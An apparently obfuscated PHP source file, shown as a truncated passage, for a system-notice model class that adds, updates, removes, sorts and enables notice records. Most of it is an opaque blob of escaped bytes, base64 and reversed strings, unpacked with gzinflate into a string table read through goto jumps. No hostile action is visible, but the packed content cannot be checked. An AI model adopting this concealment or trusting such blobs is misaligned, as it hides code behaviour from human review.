\245\235\343\136\217\234\266\0"."\370\244\50\26\351\214\262\343\14\34\47\327\43\243\301\246\25\374\144\201\103\133\2\113\335\20\274\6\342\201\105\145\301\134\71\204\341\104\12\113\104\43\130\213\26\14\267"."\270\12\304\132\271\203\100\47\54\21\16\265\57\56\233\200\366\362\66\251\10\5\206\342\301\66\67\314\131\103\54\210\327\257\210\67\206\43\115\122\162\50\122\72\22\234\131"."\340\100\252\203\243\100\377\311\125\335\153\210\30\121\217\244\211\364\132\54\254\173\23\110\326\137\320\275\256\272\252\333\277\300\67\205\353\230\50\75\221\56\122\216\3\266\30".strrev('˜äz!†\'n}­×`|ùp­j>£²ğQ‘‰yî~İü„|>üÄ´€Á–ğw¯İ')."\210\255\210\361\321\246\250\130\56\335\201\137\64\233\154\131\340\312\214\376\166\310\131\261\61\113\331\214\16\4\165\134\107\225\101\76\335\20\153\101\54\332\264\221\52\142\67"."\70\142\304\305\66\203\100\76\107\25\210\134\367\13\51\27\326\134\214\255\315\74\332\166\140\107\154\102\114\333\242\326\320\111\213\303\155\355\221\216\45\321\130\274\163\351\262"."\345\53\126\302\350\62\24\350\125\274\314\213\25\270\107\364\17\252\246\177\220\271\324\135\212\171\156\315\362\313\74\17\7\242\76\42\162\307\210\225\237\212\342\74\25\323\6"."\177\371\44\132\233\77\227\267\153\307\311\321\141\152\111\303\260\307\111\135\332\366\355\25\103\142\127\267\325\303\160\316\237\326\6\375\202\133\141\44\214\113\32\260\137\173\145"."\327\276\30\75\145\306\53\235\164\155\276\0\310\162\316\111\332\242\5\260\216\231\355\255\360\346\274\351\356\370\42\354\343\260\173\45\237\153\335\224\234\14\246\214\174\132\227"."\xee\xc7\xab\x29\xc6\x63\x15\x53\xfd\xfc\xfa\x39\xa6\xfe\x96\x77\x48\x67\xd8\x34\x91\x8b\x5f\x60\xbd\x94\x50\x53\x54\x1c\x95\x2c\xf7\x6\xbc\x58\x1a\xf1\xaa\xd9\x3e\x3\xf1\x5b\x99\x1c\x83"."\xaa\xfd\x8e\x74\xe1\xde\xb2\x60\x64\x75\xe6\x77\x6c\xc0\x8b\x3e\x21\xa5\xd1\xcc\xa8\x72\xb6\x87\x62\xbb\x3\xee\x1a\x14\x47\x2c\x1e\x93\x97\x18\xd9\x65\xb8\x91\xd\xde\xcb\x5a\x5d\x2b\x9a"."\x3\xb9\xe3\xd2\x18\xe9\x44\xbd\x32\x1d\x3c\xf5\xb6\x20\xc6\x57\xba\x9e\xc8\xfc\xab\xa\xb9\x11\xb3\x4e\xc4\x39\x2d\x8d\x7a\x14\xe1\xa4\x9b\xa9\x2b\xcb\xf3\x75\x58\xd1\x24\xdd\xb7\x4c\xc9"."\xd7\xe5\x19\x31\xce\xf5\xb\x73\xae\x5c\x3f\x37\x98\x48\x39\x98\x13\xcc\x7\x88\x98\x29\xf1\x1f\xe0\x1e\x1b\xa5\x35\x8e\x30\xd3\x29\xb8\x2a\xd9\x38\x12\x95\xdc\xfd\x53\xd3\xe\x28\x94\xcf"."\226\262\365\330\267\201\354\171\74\260\54\66\335\333\332\26\150\362\242\255\246\216\335\55\100\33\176\167\34\355\370\14\341\324\41\153\72\223\103\50\144\352\114\45\203\146\10"."\60\251\324\75\350\104\247\133\134\12\244\376\56\123\246\226\306\6\56\214\303\244\120\27\206\121\240\240\37\64\116\375\250\1\152\242\25\303\33\214\273\1\64\254\314\167\227"."\227\375\356\362\162\337\135\356\372\356\362\322\357\122\220\13\223\205\115\15\214\130\241\320\224\301\70\343\240\272\16\120\112\216\260\35\257\27\33\342\310\146\101\240\1\245\266"."\xbe\x3e\x94\xdc\x4c\x99\xef\x34\xcf\x6f\x89\x10\x5f\x3d\xbd\xd2\xba\x72\x54\xe7\x83\xad\x21\xcd\x36\x58\x8b\x11\xbb\xac\x6a\xd9\x4b\x1d\xee\x77\xbe\xd3\xa9\x2d\xf6\x11\xd1\xc6\xc5\x25\xce"."\343\372\15\313\362\143\227\176\204\263\347\106\155\221\30\73\343\161\366\211\132\4\111\322\71\70\31\343\36\127\271\77\126\341\264\225\252\346\151\70\310\335\246\40\1\45\320"."\207\135\137\40\172\10\243\22\34\56\30\226\46\173\13\116\153\304\305\44\277\143\56\271\326\315\251\303\230\142\131\54\46\234\354\62\227\265\262\177\77\74\140\336\234\303\1"."\xf8\xb0\x17\x75\xdd\xe5\xa6\xd6\xd2\xb4\x7e\x26\x88\x4a\xc2\xa\x57\x1e\x74\x70\xf7\xb3\xee\xee\x60\x8c\x12\xc4\xd3\xe4\xae\x89\xe9\xa9\xae\xb7\x2c\xc0\x2b\x79\x6d\xa0\x54\x43\x72\x55\x8d".base64_decode('2gVV42bCes6QsYE+p+jPynK99prCHzCaS+o0frE2wnztulaEyz1v96Lutu64PEw=')."\xb6\xa9\xf6\xf6\xa2\x66\x4b\x1e\x3f\x1d\x6d\x11\xde\x80\x1\xfd\x30\x3d\x13\x26\xb1\xe3\xfa\x12\x86\xc3\x8b\xc9\x65\x5d\x11\x43\x22\x91\x4e\xfc\x26\x31\x8a\xf3\xc\x25\x38\xe6\x92\xd7\x21"."\312\340\356\22\14\7\354\355\25\226\164\205\242\364\100\211\214\57\170\273\147\103\112\224\17\324\203\63\43\41\304\263\62\170\151\157\140\75\102\103\227\157\64\322\260\167\256".strrev('†€Xv æ\'79!€¸Q“ƒT	b~¢£´€1xâK0*xWVı'."\n".'±1_QX˜@©')."\126\72\346\131\100\106\3\257\375\72\177\235\177\10\350\301\202\1\374\105\361\64\202\173\117\30\116\40\62\310\216\57\22\62\61\6\62\17\243\56\247\264\362\226\60\62\335"."\326\74\203\121\325\100\333\112\257\160\67\74\157\301\160\56\253\200\104\332\120\131\353\253\251\124\330\133\32\15\225\235\361\26\357\354\312\5\363\367\237\327\104\16\175\155\255"."\15\237\332\142\127\316\124\121\60\37\16\145\346\341\345\305\43\176\147\154\274\262\200\177\71\165\324\310\243\255\17\121\250\234\57\5\203\331\311\251\230\360\0\235\327\354\41".base64_decode('w4QTbSCwdTXTZZwGFLHY0iZ+E+qxHpN1v7MwUsx7sbrCG5M92Ln8y9c482OFgzM=')."\277\114\32\123\202\174\344\104\220\276\25\120\257\310\217\102\110\376\165\275\230\107\240\253\222\351\276\0\206\251\46\3\351\262\267\142\206\327\230\44\46\234\44\161\241\253\275".base64_decode('eKi9iDnD+I8WFdqOba1cFucrBe63C9yjQIrgyfXKjyIMI84cJ2OX6V48v149PV4=')."\212\130\324\145\233\232\2\124\51\227\245\263\250\247\335\237\44\106\4\336\142\221\175\260\154\245\262\334\300\62\220\116\204\170\175\16\16\136\105\163\315\231\166\267\20\40\351".strrev('Œ1`İ~K„ğßXgˆŒ½üò›™®Ì@Ù‘äı1Ÿ«MÔ«Å£İK—')."\x7c\x85\x33\x2\xe2\xc8\x27\x5a\xeb\x78\x10\x3\x3a\x4a\x65\x7b\xc9\xff\x3c\x51\x84\xd3\x95\x84\x2d\x83\x12\xdc\x9f\x7f\x19\x4a\x8a\x84\x36\xb6\x61\xc0\xb6\x2b\x31\xc2\x7c\x42\xfa\x58\xc0"."\344\371\125\261\104\222\331\176\321\223\44\66\41\7\14\357\107\15\65\4\233\105\266\134\111\353\234\312\24\363\375\15\122\242\142\33\206\222\123\363\43\40\65\114\262\352\47"."\x59\x73\xf1\x87\x1a\x26\xf9\xa6\xf7\x5a\x28\x2\xf4\x9a\x7b\x67\xc5\xfb\x88\xf0\xd5\x47\xdd\xd3\x40\xa\x55\xfb\xfb\xf0\x43\x1a\x3e\xbc\x49\x45\x8b\x90\xab\x23\x5b\xe4\xf\x25\x14\x48\x18"."\x5a\xd8\x11\xee\x5c\x14\x6a\x97\xc\x98\x24\x40\xa2\xa9\xb9\x3d\x11\xe8\xe8\x28\x9b\xc0\x19\x16\xac\x4c\xc4\xa7\xff\xbe\xd5\x30\x4\xf8\xd9\x23\xa0\xa0\x7a\xae\x4f\x49\xe1\x7b\x15\xd\x15".base64_decode('GFqhWGaK+ait8AMdJRmEnDVPhyKVuIjSi9DES0I0uXL+PL8+nw+2cAZkGuLaiM8=')."\177\42\226\272\374\330\104\50\77\31\317\256\154\261\100\240\55\302\365\217\242\314\123\25\72\216\15\225\330\176\243\267\122\311\240\375\230\333\107\316\167\27\156\147\347\110\363"."\xfc\xaa\x9c\x88\x57\x56\xd4\x60\xec\x2f\x17\xaa\x6\xb9\x42\xbf\xec\x49\x45\x40\xf2\x68\x4d\x1e\x36\x68\x52\xf3\x4b\x4b\x8b\xe0\xca\x7d\x29\x39\x89\xce\x24\xb9\xd8\x52\x9a\xdf\x4f\x34\x6".base64_decode('fiHvOY9u+GlHGaTw8eeBCmqqH2OUIP/wTUjowCIKTXB46rclE40ivuRFFPKmeG4=')."\144\315\32\132\21\336\361\327\255\53\205\201\225\247\73\51\120\320\335\40\214\71\156\30\26\315\5\14\355\143\316\317\120\254\225\63\11\10\313\103\177\105\231\160\373\42\21".base64_decode('oSKJI7GLGVSTWHdXpW/KunV+ndlCMbsNVtbHc9N4t8+ZH/UEhp5nBIA7J+UfT4I=').base64_decode('xbe/f4q4mMZtnhRsCNXQML+Ln//0sDTGBOq1s9n0j2a88WU82NQu2FyO5JSe+Ig=').base64_decode('WiXgdIK7YJA/lEFHVQ4HCgU5yl6HIWcRWT3p56udnk/4UuI+F8tCaI0Ljg2WXAk=')."\370\342\13\1\17\42\142\210\270\256\325\156\70\252\213\3\171\140\236\225\62\365\202\355\240\123\364\41\273\12\362\220\311\152\165\120\245\131\52\24\220\317\33\52\210\43\367".base64_decode('CkSXaAoQBNGUeZgAKaaWbaggzbUymobKExJT7iOoYIXCqGNO5SNm2gba+PjNIng=')."\102\250\63\12\127\41\2\355\160\376\3\54\325\211\47\323\337\211\47\62\104\41\357\131\145\65\223\332\173\23\252\103\116\4\173\205\356\13\136\64\352\210\106\342\221\46\366"."\50\114\71\45\331\164\306\277\132\364\52\234\220\163\330\255\35\156\26\301\162\160\216\300\17\20\230\176\263\230\317\163\13\63\314\42\362\155\213\310\303\132\32\326\0\75\135"."\x8b\x65\x8a\xb6\xd8\xfe\xb0\xd7\xf7\x38\xbe\xe3\x6b\x1\x58\x72\xd3\x87\x9d\x4\xa2\xc2\x5d\x54\x5f\xd9\x50\xc3\x2e\x5e\x30\xa3\x34\x71\x33\x8c\xe5\x24\x67\xa4\x84\x2a\xe7\xfb\x7a\x1c\x49"."\145\252\247\152\342\70\267\7\323\362\16\315\7\155\126\326\140\116\15\353\152\152\152\274\65\265\350\177\176\140\14\234\132\175\115\115\111\226\232\232\172\362\77\115\40\112\136"."\x98\xb\x67\xa\x5a\xfa\x8c\x66\x31\xd7\x9\x9a\x6\xd\x82\xd\x21\xa7\xe7\x8b\x8c\x99\xea\x6a\xc2\x97\xb8\x14\xdc\xb4\x1e\xc6\x3f\xb0\xf6\xa3\x69\x20\xbe\x6\x19\xf9\x98\x2b\x89\x80\x73"."\x15\x72\x20\x9\x31\xcd\x3d\x8\xfc\xa4\x17\x26\x96\xed\xc3\x98\x5e\xb0\x30\xe2\x69\xd0\xa8\x92\x41\x81\xf6\xf2\xfb\x83\x28\x9b\x40\x9f\xb9\xf4\xba\x66\x3\x6f\x54\x30\x9f\xee\x92\x3f\xe6"."\x63\x83\x4b\x81\xc2\xfb\xb1\x97\x25\x78\xe5\xd7\x4\xa0\x10\xdd\x18\xc4\x31\x87\xa3\x69\xa8\x8c\xd3\x89\x21\x86\xa0\xd\x3a\xc5\xfb\x89\x1\x92\xa6\x4\x33\x68\x92\x63\x46\x1c\x95\x4f\x33"."\x48\x32\xbf\xae\x47\x62\x59\xee\xf\x0\x47\xdb\x79\x4d\xf4\xd1\xa\x7a\x69\xe\xc6\xb0\xc\x26\x67\x8c\xa1\x84\xd8\x83\x71\xf4\x24\x1e\x23\x43\x8a\x45\x25\x86\x86\x69\xe9\x4a\x25\x1e\x57"."\x46\x8d\x19\xda\x31\x3b\x5\x30\x7b\x20\x57\xe4\xfb\xf5\xac\xe3\x62\x70\x42\xaa\x5b\x1e\xcd\xb9\x38\xa3\x3c\x4a\x68\xad\x6\xf8\xeb\x1c\xd4\xa8\x90\x7d\x5e\x81\x85\x7\xfc\x1\xde\x22\xc8"."\x23\x6a\xd4\xe\xb4\x7e\xff\x92\xf9\xb3\xdd\x73\x47\xa6\xc1\x34\xc4\xb5\xde\x92\x87\x30\x59\x4c\x9a\xc\xa6\x34\x8f\x7d\x87\x55\xe\x83\x4\x19\x80\xda\xb1\x34\x71\xb7\x85\x52\x5\xee\x24"."\127\231\100\132\172\252\321\22\376\12\233\270\263\124\331\211\41\75\367\227\254\103\54\360\310\56\16\372\131\35\203\222\174\343\53\230\106\37\232\35\113\356\53\202\167\224\7"."\363\354\245\71\313\144\342\35\222\363\311\100\174\146\301\136\40\4\104\23\67\202\125\361\202\251\224\125\150\273\45\240\163\235\111\11\115\374\355\33\31\210\345\45\331\264\203".base64_decode('GMU668CCmBPCW/YtuMIEaBteoJRNAmk2QSuwckNWweoGsxrBoyFOcJ1wCqPirOM=')."\320\47\116\310\115\126\143\217\137\2\101\42\170\217\53\40\326\65\256\1\24\270\12\253\253\241\101\56\346\114\173\347\354\237\260\300\45\54\27\36\102\256\215\223\325\324\170"."\370\22\262\246\1\57\272\126\376\76\143\31\244\163\42\126\11\6\221\115\33\127\120\317\11\222\24\103\142\26\24\124\323\254\275\3\105\215\161\217\22\365\122\154\101\273\200"."\xd2\xc4\x33\xa6\x61\x73\xc9\x2\xa7\x7\xd2\x12\x45\xe\xcb\xbc\x43\x9c\x16\xf1\xce\x17\xdf\x71\x9c\x72\x49\xfe\x8d\x79\x56\xb4\xdb\xb0\xaf\xab\x6c\x7\x22\xa6\x5c\xc4\x2f\xbf\x24\xec\xb8".base64_decode('om5zL7Jb2IzgM8fQef5yEp7OmGRtU+YLUIgXgW3M1FKGSaReyVVB3o5qfXI0bHA=')."\x69\x1f\x9f\xa2\x68\x65\xaa\xc0\xde\x61\x24\x14\xc7\x58\x80\xe4\xd0\xa2\xec\x6b\x46\xf2\x2b\x8d\x62\x92\x23\x6f\x89\x1d\xf1\xd6\x2a\x9c\x8f\x49\xd0\x9a\x69\x64\xaa\x94\x40\xf2\x97\x63\x69".base64_decode('XDon6T4BEbNjxSRX/bsYDXZFQZH3cXbnAFdA3H7gHlhyGqoW+5AVPZOLkG+WFKE=')."\151\170\53\25\316\63\344\24\13\311\145\170\250\306\117\51\363\51\222\44\215\150\212\273\20\202\321\21\203\4\11\43\32\263\350\363\326\326\171\247\201\146\131\276\277\300\330"."\x5c\xa0\x59\x68\x2d\x48\x68\x80\xb9\x7d\x46\x7\xc1\x3c\xf\xf2\x89\x3c\x86\x74\x80\x42\x1c\x6a\x8\x87\x3\xc4\x77\x8\x9f\x4f\xe2\x64\x84\xc7\x4c\x69\xdf\xd2\xb8\xe9\x1e\xf1\xb6\x21\x93"."\25\161\36\116\55\372\160\206\316\162\351\164\204\160\162\263\303\340\321\225\1\255\14\147\72\70\13\317\71\36\311\106\170\340\260\232\161\125\2\16\341\145\47\350\244\224\350"."\x87\xb0\x1d\x45\x20\x83\xba\x24\x97\x6\x46\x9c\xeb\x53\x3f\x24\xcc\xe8\x95\xd3\x25\x1\x8e\x1b\x1c\x58\x6a\x1b\xe0\xe3\x46\xbf\x70\xb3\x13\x9e\x41\xac\xaa\xc6\x37\x3b\x1d\xba\x95\xb6\x11"."\x7e\xff\xe\x5b\xee\xe0\x4d\x82\x5b\x5e\x5a\x72\x84\xa5\x72\xe4\xb4\x1c\x11\x6a\xa9\xe4\x28\xcd\x41\x3c\xd7\x90\xc6\x2e\x69\x32\x1d\x40\x47\x6b\x87\x9f\x83\x1a\xf9\xf2\xa4\x72\xa3\x70\x7f".strrev('$Şƒi÷$êÃ<‹Ê‰”¹ßĞâx=élÓéX¶(spMB‹#„¥=9CÚ»ÄÌÄÔ')."\142\52\275\151\316\133\133\202\213\226\354\265\244\7\173\234\325\122\374\323\314\222\32\363\370\356\105\266\244\14\126\344\225\311\235\25\172\55\51\163\301\324\112\363\217\150\344"."\xf1\x6c\xd1\x62\xa9\x40\xb1\x4c\x6b\x20\x7f\xf9\x2f\x20\xf4\x77\xe6\x46\x1b\xb1\x96\x1f\xaf\xf1\x7a\x7e\x50\xb7\x74\xb1\xf0\x59\x89\x11\xb9\x76\xa1\xaa\x34\xf9\xb3\xa\x69\xf9\x15\x6\x69"."\x6\xc4\x60\xd3\xaf\x94\x7a\xdf\x2\xdf\x45\xb2\x33\x6f\x97\xd0\x4c\xa7\x49\xf6\xc2\x56\x60\x8a\x77\x78\x2b\x4e\x3c\xe3\x41\xa2\xd2\x3\x2b\x5\x53\xd5\x2d\x4d\x2\xd0\x97\x3e\xa6\xc0\x95"."\6\44\342\73\136\100\313\366\112\321\242\163\7\55\373\251\4\375\0\203\111\216\336\312\145\210\342\147\254\377\327\115\325\323\302\341\222\236\146\347\377\374\6\32\365\23\337".strrev('ÏÚ"³äfÌ\'Ä\\^ ’(XRÀØ°ƒ+Íì5ç»\\‘ãG>wÌˆòY¾Ç–¿$')."\x87\x98\x6\xb0\x5f\xb9\x20\x53\x1a\xe3\x88\x60\x80\x71\x76\xa8\xd\x7f\x8e\x8a\x40\x48\x20\xc3\xda\x17\xc6\x2a\x33\x7b\x44\x44\xf\x60\x9c\x1d\x67\xa5\xae\x87\x75\xdc\xe6\x9a\x8e\x7\xa9"."\113\276\201\255\276\240\36\242\337\101\71\173\104\347\120\214\277\375\40\212\272\123\312\64\0\45\53\102\203\301\63\50\15\112\15\175\352\211\173\363\127\346\261\373\264\342\3".base64_decode('xBNUMFewHeJhq2ynLc0NBRCORogE2IrFyI2UABxqizBrFzePw28Z5HsNefwI4cU=')."\x46\xf7\xf4\x1d\x36\x2a\x87\x7a\x10\x4f\xaf\xd9\xa5\x4f\xb3\xd0\xe2\xff\x27\x5\x69\x62\x4c\x32\x1a\x74\x56\x52\xda\x20\xcb\xbd\xa5\x9\xf6\xa\xbf\x3a\x93\x31\x86\x9c\x8f\xb1\x61\x88\xfb"."\235\31\307\13\63\322\242\41\327\76\345\67\161\330\313\44\210\163\265\344\305\47\125\70\211\376\164\303\57\333\214\334\125\123\362\3\137\257\346\250\322\224\321\263\151\223\33"."\133\10\100\233\46\104\112\122\12\333\33\250\354\261\117\362\44\125\63\243\264\360\70\205\363\175\14\16\126\234\257\155\210\107\114\304\316\347\174\346\201\37\31\132\2\305\55".base64_decode('2/GMSNyIq30eyk9hWiVijSNyWDbEJL1AiRYjbHwW50sZ2JteaQ95cIoSMPfrF9I=')."\372\341\124\121\56\335\227\65\222\152\66\112\155\224\34\27\57\114\44\13\161\73\104\107\66\12\362\253\205\302\270\107\32\300\343\320\343\215\142\76\104\125\305\16\250\51\311"."\132\262\51\54\75\310\21\167\231\40\73\372\132\7\75\271\201\156\313\125\262\323\64\256\234\154\221\236\166\366\227\236\276\141\33\52\130\355\262\311\41\34\204\372\144\141\10"."\62\50\363\24\61\301\216\105\206\21\2\161\244\36\22\40\253\130\146\236\277\5\312\361\320\371\76\12\105\130\362\323\254\365\162\111\2\307\305\116\53\173\155\20\247\356\356".base64_decode('p7bYZ/i7YR7aM/EaJH0lzMNfBPNQx34eeAfMI+6kfdsTK+LFVuczr7jN3CavhKU=')."\x77\x73\xf3\x7c\xa8\x5c\x5\xa2\xee\x81\x8b\x1b\xa5\x3a\x3e\x71\xe6\x98\x2f\xe6\xc4\x29\x2e\x8a\x38\xa5\x9b\x92\xe\x4b\x3d\x2c\x9a\x59\xf\x39\x71\xf5\x30\x5f\x66\xae\xe1\x10\xbd\x92\x67".base64_decode('pswYfncd1DSTiCxpJ9Wpn5c02amVO5vuwLqEqYm7GdTNZMlTPity6bppM+bIqgE=')."\61\77\342\374\147\32\375\201\263\50\340\1\304\214\53\116\174\122\230\157\113\171\335\222\104\247\325\154\351\203\175\56\12\374\277\303\174\301\173\323\254\222\15\153\351\263\246"."\45\43\100\220\120\262\356\220\66\44\327\121\276\201\117\330\55\261\174\350\26\44\236\351\163\176\213\156\312\145\372\41\355\73\142\45\320\167\323\214\54\226\120\163\130\313\152"."\233\252\123\34\53\47\165\220\221\140\42\216\116\336\34\326\334\155\47\3\3\272\10\221\54\211\45\162\215\266\341\126\244\340\342\170\137\42\172\274\110\76\13\333\46\276\153"."\x2b\xd6\x94\x44\x52\xfe\x17\x13\xc8\x24\xf\x2a\xa4\x8\x43\x8e\x32\x3d\xf7\x2f\x64\x74\xa3\xcc\xbb\x78\xd2\x69\xf8\xb7\xb4\x9b\xf2\x4c\x5c\xca\xf2\xaa\xb6\x57\x42\x48\x49\xf9\xa6\xd9\x11"."\x32\xc1\xc0\x7d\x8\xa1\xcf\xd9\x57\x57\xf5\xa8\x98\xa8\xa3\xc7\xa3\x8c\x97\xa9\x94\x71\x92\x9e\xcf\x13\x5e\x96\x24\x96\x9\x97\x66\x97\xfa\xc6\x91\x99\x19\x71\x92\x1f\x6\xb4\x33\x42\x28".base64_decode('oCvUsVolj7HyLSdSkbwMSquW3mcTahSid4FOwBomziPJ7bbAIn7jTZWMb/B4Sk8=').base64_decode('Yxpy2HmdPMJ8dKLvOaQ0FG92vZ5K6JD7SVU2KGTxC7omXZ10iAT89SuHiGC5H6Y=')."\103\54\225\354\75\27\105\71\332\303\6\12\4\220\330\65\323\257\111\373\243\330\12\105\150\274\307\316\235\57\241\73\156\230\142\377\100\256\265\316\356\255\132\256\347\42\251"."\7\124\32\146\354\365\377\365\113\154\377\257\36\140\233\121\303\224\325\216\307\127\27\1\223\313\70\262\121\311\167\62\125\224\272\372\341\334\46\367\3\54\342\317\15\113\161"._kodDe('KLJkcr8nOkfNMSBHUk+pP+1/WUZOROg4G3S0rvSvWMl+aAl0OK5SvY4YTKneNcJZ').base64_decode('qaTKuE/p7WI91V/moBBPRtjpVljiGUqyCfKFWAvmS8vPQiksRWHGklFN+YpkpMA=').base64_decode('5K1qINQ9Cxl1IZeugcjIhMUBKiFHcccQO4Dy6Im31/nLz44Sba6H/GgmSx5bh74=').base64_decode('uvTcuLQ0X9ZyEWwC61Tt8JeVa9xPLdd6Sz9GLdCxdiGK5XmmoSFHGuTIsUwZioY=').strrev('¦Vq%„€4uÓÆy-ù”>²C¹Bs?„aİe²şä‡'."\n".'º…ò9~P…œg‘1').base64_decode('xKc4dDvW2VZFLlEApiJev8UQz63nClRpJm+x7PaSZPwLIIdqy5IfaXCWxObczpU=').strrev('‘$‹çi¿qÜé ÊL/"u•1‚\'x;wz8SF;j”¿—/6RZa”¶\\¿2')."\200\231\223\106\250\101\72\171\162\36\374\161\7\330\45\204\254\250\207\245\144\122\212\371\376\102\277\370\26\127\110\270\25\40\311\124\247\36\30\124\155\166\174\346\56\345\174"."\x44\x59\x3a\x26\x4c\x11\xdc\x9\x96\x9e\x4\x89\x3\x2a\x89\xd\x60\xc5\xb0\x68\x22\x28\xb4\xb\x2e\x6d\x3\x82\xda\xa9\x83\x82\x6b\x11\xcc\x71\x3a\xcd\x1f\xec\x76\x64\x4d\x33\xf1\x80\x43"."\21\104\274\355\215\271\36\351\2\251\260\67\326\206\334\357\261\372\344\113\247\216\214\245\120\161\301\124\52\57\316\12\104\67\61\254\134\367\311\222\161\26\227\57\260\162\244"."\x12\x20\xea\xf3\x9f\x1b\xd0\x48\x82\x8\xb6\x9b\x17\x96\x35\xb4\x2b\x5c\xaa\x16\x9f\x74\x5e\x97\xe5\xd9\xf8\x9c\xa1\x3c\xe4\x96\x82\xd7\x1\x75\x89\x56\x58\x47\xc1\x36\x74\x57\x92\x25\xbf".base64_decode('Re48/ZPFfAkFtGxYqk4+GRy3QKz8RwRWOodYumcsEthmZTgGXyJ2vGOQMyonOpo=')."\xe3\x9e\x5a\x22\x15\x8\xf4\xa5\xc0\x1c\xd1\x6b\xd2\xb4\x80\x33\x89\xe6\xd7\x5c\xad\x97\xb\xb8\x7b\x46\x4b\x58\x43\xba\x9d\xca\x48\xa2\x4a\x69\x62\x29\xdc\x2c\x19\x54\xf8\x50\xf9\xf6\xba"."\133\305\306\324\55\300\211\112\112\332\43\231\27\304\215\62\145\150\213\312\26\243\111\270\244\340\46\35\145\307\31\2\134\226\46\341\262\45\311\254\260\244\357\220\312\331\152"."\xd1\x1a\xa7\x7b\xa5\x83\x7\x4a\x80\x74\x99\xe\xbb\x44\x65\x9a\x75\xbc\xf1\x2c\x9b\xb9\xf4\x73\x80\x71\xee\xdc\x44\x6b\x50\xbe\x15\x42\xd8\x77\x1d\xf3\x96\x6b\x45\xd9\xcc\xe3\xb6\x42\xe4".strrev('ÃË‚à…iË}.ËD;ÊM–I•ı–xh¬ei)yÅ]C)K-håív').strrev('´–ccYgÉEó5›RW?ÎÄ¿•Øcv‘6ø7Ÿß1zH9\'{¬—•Ş&ì’,')."\113\145\332\254\312\364\346\222\225\66\225\132\14\133\117\151\116\57\237\262\307\41\232\316\76\222\225\364\163\56\325\230\220\373\35\7\346\145\224\107\4\4\354\232\120\101\73"."\x2c\xdf\xe9\xfe\xf\xba\x77\x7a\xa4\xd6\x84\x8f\x6e\xf9\xb1\xb\x71\x43\x49\xf7\x4b\x9a\x1c\x33\x4c\xdb\x83\xd3\xe2\x46\x81\xfc\x36\x1a\xb6\x2d\x8e\x98\xa9\x34\x4d\x98\x3c\xbc\xe9\x79\x24".base64_decode('SwkUEmcseBSJ2p+gIyEbJAiHe1hMjWk0lRAbRwQfJ/CIvKfBIV9L0XUMKQBIiEw=')."\32\303\314\311\37\276\121\53\332\43\36\160\127\335\214\234\340\101\0\337\144\273\17\162\157\331\362\323\24\77\70\212\367\222\72\340\255\51\337\352\102\237\243\70\175\261\207".base64_decode('2zJ+Ww2guhRVUC/RRMGEXalTJ4klSR2BWGxZJNpMnUqXJJNSkh1NSVJHa6R9vLQ=')."\140\133\40\24\56\111\303\46\67\355\11\341\5\212\46\205\72\110\53\3\341\160\144\331\170\255\10\65\55\26\55\41\47\247\102\43\136\310\30\114\321\315\116\14\142\152\226"."\311\322\322\145\74\55\47\334\201\211\62\116\25\201\74\257\26\363\224\307\3\316\27\132\134\226\155\14\141\241\42\154\56\323\16\165\107\13\0\305\116\266\371\342\346\314\262"."\x7c\x3d\x49\x1c\xb\xfb\x1c\xc7\xc7\x12\x9c\xac\x13\x42\x5d\x24\xfc\x93\x37\x56\x2\x98\x52\x76\xb0\x64\xcd\x6a\xa9\xa6\x9f\xa4\x8a\xc1\xc0\x8d\x3c\xc9\x0\xbb\xab\xd5\x46\x52\xd2\xe4\x53".base64_decode('sQUux8HwSuZRNAzJ/wOUEkxze6YAAA==')."".""."", 10, -8))); goto d‰“ä¤Ö…é; d‰“ä¤Ö…é: define($_SERVER[ì…™Î¶Ï][0], $_SERVER[ì…™Î¶Ï][1]); $_SERVER[ ¼ÕÆÇ] = explode($_SERVER[ì…™Î¶Ï][2], gzinflate(substr($_SERVER[ì…™Î¶Ï][3], 10, -8))); function binCheckEq($…¦Õ´›¨, $Ê¼œ›€) { return $…¦Õ´›¨ == $Ê¼œ›€; } goto cÁ£ÌÆ„; eàªøÖ¯: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x6e\157\x74\x69\143\x65\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\157\x6e\x74\145\x6e\164", "\x61\x75\164\150", "\155\157\144\x65", "\164\151\155\145", "\164\x79\160\145", "\x6c\x65\166\x65\154", "\145\156\x61\142\x6c\145", "\163\157\x72\164"); public function listData($Ñãí©Ê = false, $‘–÷Ä = "\163\x6f\162\x74", $ãê‡»Å = false) { return parent::listData($Ñãí©Ê, $‘–÷Ä, $ãê‡»Å); } public function add($×‹ÎÒ¾ç) { $¤ÓŸàŸô =& $_SERVER[ì…™Î¶Ï]; $ªÔâí‘Ô = time(); if ($×‹ÎÒ¾ç[$¤ÓŸàŸô[16]] == $¤ÓŸàŸô[2213]) { $ªÔâí‘Ô = strtotime($×‹ÎÒ¾ç[$¤ÓŸàŸô[196]]); } $×‹ÎÒ¾ç[$¤ÓŸàŸô[196]] = $ªÔâí‘Ô; return parent::insert($×‹ÎÒ¾ç); } public function update($ºœßÍÍä, $ƒòÉ”™ƒ) { $íšş®Î¹ =& $_SERVER[ì…™Î¶Ï]; $†ºô¥ë” = $this->listData($ºœßÍÍä); if (!$†ºô¥ë”) { return !1; } $ÇÙ¦¸Œ = time(); if ($ƒòÉ”™ƒ[$íšş®Î¹[16]] == $íšş®Î¹[2213]) { $ÇÙ¦¸Œ = strtotime($ƒòÉ”™ƒ[$íšş®Î¹[196]]); } $ƒòÉ”™ƒ[$íšş®Î¹[196]] = $ÇÙ¦¸Œ; return parent::update($ºœßÍÍä, $ƒòÉ”™ƒ); } public function remove($—¯»öİ) { $ÅßœÈ’ä = $this->listData($—¯»öİ); if (!$ÅßœÈ’ä || $ÅßœÈ’ä[$_SERVER[ì…™Î¶Ï][1250]]) { return !1; } return parent::remove($—¯»öİ); } public function sort($à¸Û¾Ò˜, $İ³¢»Ô) { return parent::update($à¸Û¾Ò˜, $İ³¢»Ô); } public function enable($çˆ€“ë», $êğ¢øæ) { return parent::update($çˆ€“ë», array($_SERVER[ì…™Î¶Ï][2214] => $êğ¢øæ)); } private function initUserOption() { $İÛšÕ™Ş =& $_SERVER[ì…™Î¶Ï]; $this->optionType = $İÛšÕ™Ş[2215]; $this->modelType = $İÛšÕ™Ş[2216]; $this->field = array($İÛšÕ™Ş[2217], $İÛšÕ™Ş[32], $İÛšÕ™Ş[196], $İÛšÕ™Ş[33], $İÛšÕ™Ş[2218], $İÛšÕ™Ş[725], $İÛšÕ™Ş[188]); } public function userNoticeGet($®ÅÁË•Ï = false) { $this->initUserOption(); return parent::listData($®ÅÁË•Ï, 